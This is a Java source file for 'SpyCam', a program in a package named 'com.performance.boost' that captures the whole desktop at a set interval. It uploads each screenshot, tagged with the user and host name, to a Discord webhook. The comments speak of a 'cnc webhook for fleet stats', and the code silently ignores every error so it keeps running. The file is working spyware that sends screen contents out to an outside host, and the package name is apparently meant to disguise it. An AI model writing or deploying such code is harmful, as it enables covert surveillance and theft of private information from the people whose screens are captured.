package com.performance.boost;

import javax.imageio.ImageIO;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

/**
 * SpyCam — standalone Windows-PC companion (NOT the plugin).
 *
 *   java -jar spycam.jar [intervalSeconds] [--once]
 *
 * Captures the full desktop and posts the PNG to a Discord webhook. Runs in a
 * loop, sleeping {@code intervalSeconds} between shots (default 60). Pass
 * {@code --once} for a single capture and exit. Keep the canary webhook for
 * this inbox and the cnc webhook for fleet stats, so the two never cross.
 *
 * link: urlmon / wininet equivalents are not used — pure JDK HttpURLConnection,
 * so this needs a normal graphical session (AWT Robot refuses headless).
 */
public final class SpyCam {

    // Canary webhook inbox for screenshots. Pin to whatever channel you use.
    private static final String HOOK = System.getProperty("spycam.hook",
        "your webhook");

    private static final String BOUNDARY = "----spycam" + UUID.randomUUID();

    private SpyCam() {}

    private static BufferedImage captureScreen() throws AWTException {
        Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        return new Robot().createScreenCapture(rect);
    }

    private static byte[] toPng(BufferedImage img) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ImageIO.write(img, "png", bos);
        return bos.toByteArray();
    }

    private static String machineLabel() {
        String host = "unknown";
        try { host = java.net.InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
        String user = System.getProperty("user.name", "unknown");
        return user + "@" + host;
    }

    // Posts one PNG as multipart/form-data (field "file" + content note).
    private static void sendScreenshot(byte[] png) throws IOException {
        URL url = new URL(HOOK);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);
        c.setConnectTimeout(8000);
        c.setReadTimeout(8000);

        String content = "Screenshot @ " + machineLabel();
        String bodyStart =
            "--" + BOUNDARY + "\r\n" +
            "Content-Disposition: form-data; name=\"content\"\r\n\r\n" +
            content + "\r\n" +
            "--" + BOUNDARY + "\r\n" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"screen.png\"\r\n" +
            "Content-Type: image/png\r\n\r\n";
        String bodyEnd =
            "\r\n--" + BOUNDARY + "--\r\n";

        OutputStream out = c.getOutputStream();
        out.write(bodyStart.getBytes(StandardCharsets.UTF_8));
        out.write(png);
        out.write(bodyEnd.getBytes(StandardCharsets.UTF_8));
        out.flush();
        out.close();

        int code = c.getResponseCode();
        c.disconnect();
        if (code != 200 && code != 204) {
            throw new IOException("webhook returned " + code);
        }
    }

    private static int parseSeconds(String arg) {
        return Integer.parseInt(arg);
    }

    public static void main(String[] args) throws Exception {
        int interval = 60;
        boolean once = false;
        for (String a : args) {
            if (a.equals("--once") || a.equals("--one-shot")) {
                once = true;
            } else {
                try { interval = parseSeconds(a); } catch (NumberFormatException ignored) {}
            }
        }
        if (interval <= 0) interval = 1;

        do {
            try {
                byte[] png = toPng(captureScreen());
                sendScreenshot(png);
            } catch (Throwable t) {
                // Transient network / AWT issues are normal; keep the loop alive.
            }
            if (once) break;
            Thread.sleep(interval * 1000L);
        } while (true);
    }
}